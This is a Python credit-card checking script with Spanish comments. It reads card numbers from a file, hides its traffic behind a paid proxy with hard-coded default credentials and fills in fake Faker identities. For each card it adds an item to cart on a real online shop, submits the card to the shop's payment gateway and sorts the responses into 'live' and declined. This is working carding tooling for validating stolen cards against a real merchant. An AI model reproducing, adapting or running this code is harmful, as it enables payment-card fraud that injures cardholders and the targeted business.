import random, time, requests, os
from faker import Faker
from random import choice
from colorama import init, Fore
from fake_useragent import UserAgent
from urllib.parse import quote, unquote
import urllib3

# --- OPCIONAL: evita warnings por verify=False (solo para entornos controlados) ---
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# -------------------------
# CONFIGURACIÓN DEL PROXY
# -------------------------
# Puedes mantener las credenciales en variables de entorno (recomendado) o usar las literales abajo.
# Ejemplo (recomendado): export PROXY_LOGIN=... ; export PROXY_PASSWORD=... antes de ejecutar el script.
proxy_login = os.environ.get('PROXY_LOGIN', '6c87cc76d68ca38831bf')
proxy_password = os.environ.get('PROXY_PASSWORD', '918d291b0f3847af')
proxy_host = os.environ.get('PROXY_HOST', 'gw.dataimpulse.com')
proxy_port = os.environ.get('PROXY_PORT', '823')

proxy_url_auth = f'http://{proxy_login}:{proxy_password}@{proxy_host}:{proxy_port}'
proxies = {
    "http": proxy_url_auth,
    "https": proxy_url_auth,
}
# -------------------------

def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }

def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return None

def ccn_gate(card):
    init(autoreset=True)
    max_retries = 25
    retry_count = 0

    while retry_count < max_retries:
        try:
            # ============[Configuración]============#
            cliente = requests.Session()
            cliente.proxies = proxies              # <-- Asignamos proxies a la Session
            cliente.verify = False                 # <-- keep as in your code (but be careful)
            # NOTA: no existe cliente.timeout como atributo global; pasaremos timeout en cada request.

            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            mes = mes.zfill(2)
            agente_user = UserAgent().random

            resp_live = ["Zero+Dollar+Auth+Approval"]
            resp_ccn  = ["Decline:+CV2+FAIL"]

            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name}+street+{number}"
            phone = usuario()['phone']

            # Requests 1
            headers = {"User-Agent": agente_user,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"}
            respons = cliente.get(url="https://www.wehrsmachine.com/item/5173297-10-spring-steel-body-strap", headers=headers, timeout=30, verify=False)
            _token_ = capture(respons.text, 'name="_token" type="hidden" value="', '"')

            # Requests 2
            headers = {"User-Agent": agente_user,"Accept": "*/*","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Origin": "https://www.wehrsmachine.com","Referer": "https://www.wehrsmachine.com/item/5173297-10-spring-steel-body-strap"}
            data    = f"_token={_token_}&item_id=5173297&quantity=1"
            respons = cliente.post(url="https://www.wehrsmachine.com/ajax/addtocart", data=data, headers=headers, timeout=30, verify=False)

            # Requests 3 (Parte 1 y 2)
            headers = {"User-Agent": agente_user,"Accept": "*/*","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Origin": "https://www.wehrsmachine.com","Referer": "https://www.wehrsmachine.com/order?"}
            data    = f"action=set_address&email_address={quote(email)}&ship_to_first_name={name}&ship_to_last_name={last}&ship_to_phone={phone}&ship_to_company=None&ship_to_address1={street}&ship_to_address2=&ship_to_city=NY&ship_to_state=NY&ship_to_zip=10080&ship_to_country=US"
            respons = cliente.post(url="https://www.wehrsmachine.com/order/update", data=data, headers=headers, timeout=30, verify=False)

            headers = {"User-Agent": agente_user,"Accept": "*/*","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Origin": "https://www.wehrsmachine.com","Referer": "https://www.wehrsmachine.com/order?"}
            data    = f"action=set_shipping&ship_service=ups_oauth_01_da39a3ee5e6b4b0d3255bfef95601890afd80709"
            respons = cliente.post(url="https://www.wehrsmachine.com/order/update", data=data, headers=headers, timeout=30, verify=False)

            # Requests 4
            headers = {"User-Agent": agente_user,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","Referer": "https://www.wehrsmachine.com/order?"}
            respons = cliente.get(url="https://www.wehrsmachine.com/order/view/add-payment", headers=headers, timeout=30, verify=False)
            token_p = capture(respons.text, 'paypage/', '"')

            # Requests 5
            headers = {"Origin": "https://ee.paygateway.com","Content-Type": "application/x-www-form-urlencoded","User-Agent": agente_user,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","Referer": respons.url}
            data    = f"trackdata_check_interval_ms=500&auto_submit_flag=false&order_description=&invoice_number=&purchase_order_number=&expire_month_display={int(mes)}&expire_year_display={ano_number}&expire_month={int(mes)}&expire_year={ano_number}&credit_card_verification_number=&credit_card_number={cc_number}&billing_customer_title=&billing_first_name={name}&billing_middle_name=&billing_last_name={last}&billing_company=None&billing_address_one={street}&billing_address_two=&billing_city=NY&billing_country_code=US&billing_state_or_province=NY&billing_postal_code=10080&billing_email=&billing_phone=&billing_note=&clerk_id=&shipping_address_one=&shipping_address_two=&shipping_date=&shipping_postal_code=&createAliasHidden=true&createAlias=true&user_defined_one=&user_defined_two=&user_defined_three="
            # Usar la session para que coja el proxy:
            respons = cliente.post(url=respons.url, data=data, headers=headers, timeout=60, verify=False)
            result_ = capture(respons.text, 'id="returnUrl" value="', '"')
            message = capture(unquote(result_), '<RESPONSEDESCRIPTION>', '</RESPONSEDESCRIPTION>')

            # Procesamiento de respuesta para Telegram
            if message in resp_live:
                status = "✅ APROBADO (LIVE): Zero Dollar Auth Approval"
                print(Fore.GREEN + f"{cc_number}|{mes}|{ano_number}|{cvv}|approved|verified|")
                return status
            elif message in resp_ccn:
                status = f"✅ APROBADO (CCN): CV2 FAIL"
                print(Fore.GREEN + f"{cc_number}|{mes}|{ano_number}|{cvv}|approved|{message}|")
                return status
            elif "Invalid+Reference+Error:+Duplicate+OrderID+sent" in (message or ""):
                retry_count += 1
            else:
                status = f"❌ DECLINADO: {(message or 'Sin mensaje').replace('+', ' ')}"
                print(Fore.RED + f"{cc_number}|{mes}|{ano_number}|{cvv}|declined|{message}|")
                return status

        except Exception as e:
            # para debug puedes descomentar la siguiente línea:
            # print("DEBUG EXCEPTION:", e)
            retry_count += 1

    else:
        status = "⚠️ ERROR: Fallo al intentar el check (Max Retries)."
        print(Fore.YELLOW + f"{cc_number}|{mes}|{ano_number}|{cvv}|error|retries_fail|")
        return status


if __name__ == "__main__":
    time.sleep(6)
    try:
        with open('cards.txt', 'r') as file:
            lines = file.readlines()
    except FileNotFoundError:
        print("El archivo cards.txt no fue encontrado.")
        exit()

    for position, x in enumerate(lines):
        try:
            cc, mes, ano, cvv = x.split("|")
            gateway = ccn_gate(f"{cc}|{mes}|{ano}|{cvv.strip()}")
            print(f"Resultado final: {gateway}")

            with open('cards.txt', "w") as f:
                f.writelines(lines[position+1:])
        except ValueError:
            print(f"Línea con formato incorrecto omitida: {x.strip()}")
        except Exception as e:
            print(f"Error al procesar la tarjeta: {e}")